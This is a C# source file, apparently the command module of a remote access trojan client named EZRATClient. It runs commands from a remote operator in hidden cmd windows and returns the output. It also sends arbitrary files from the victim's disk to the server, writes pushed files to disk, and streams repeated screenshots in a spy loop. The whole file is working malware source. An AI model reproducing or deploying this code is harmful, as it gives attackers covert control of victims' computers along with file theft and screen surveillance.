using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using EZRATClient.Utils;
using System.Threading;
using System.Drawing.Imaging;

namespace EZRATClient.Core
{
    public static class CommandExecutor
    {
        public static void ExecuteCommand(string command, string path = "C:\\")
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);

            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            procStartInfo.WorkingDirectory = path;
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();
            string result = proc.StandardOutput.ReadToEnd();
            Program.SendCommand("cmd;" + path + ";" + result);
        }

        public static void ReceiveFile(byte[] data, string path)
        {
            File.WriteAllBytes(path, data);
        }

        public static void SendFile(string path)
        {
            if (!Program._clientSocket.Connected) //If the client isn't connected
            {
                Console.WriteLine("Socket is not connected!");
                return; //Return
            }


            try
            {
                //_clientSocket.SendFile(path); //Send the data to the server
                string dataFile = string.Empty;
                File.ReadAllBytes(path).ToList().ForEach((b) => { dataFile += b.ToString() + Constantes.Separator; });
                byte[] result = Encoding.Default.GetBytes(Program.Encrypt("dlfile;" + dataFile));
                Program._clientSocket.Send(result);
            }
            catch (Exception ex) //Failed to send data to the server
            {
                Console.WriteLine("Send File Failure " + ex.Message);
                return; //Return
            }
        }

        public static void WindowsControl(string command)
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);
            procStartInfo.RedirectStandardOutput = false;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo = procStartInfo;
            proc.Start();
        }


        // For futur use
        public static Thread ScreenSpyThread()
        {
            Constantes.Spy = new Thread(() =>
           {
               while (true)
               {
                   string tmp = "screenspy;" + TakeScreenShot();
                   Program.SendCommand(tmp);
                   Thread.Sleep(Constantes.ScreenShotSpeed);
               }
           });
            Constantes.Spy.Start();
            return Constantes.Spy;
        }

        public static void StopScreenSpyThread()
        {
            Constantes.Spy.Abort();
        }

        public static string TakeScreenShot()
        {
            string result = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ScreenUtils.ScreenShot().Save(ms, ImageFormat.Png);
                result = Encoding.Default.GetString(ms.ToArray());
            }
            return result;
        }


    }
}
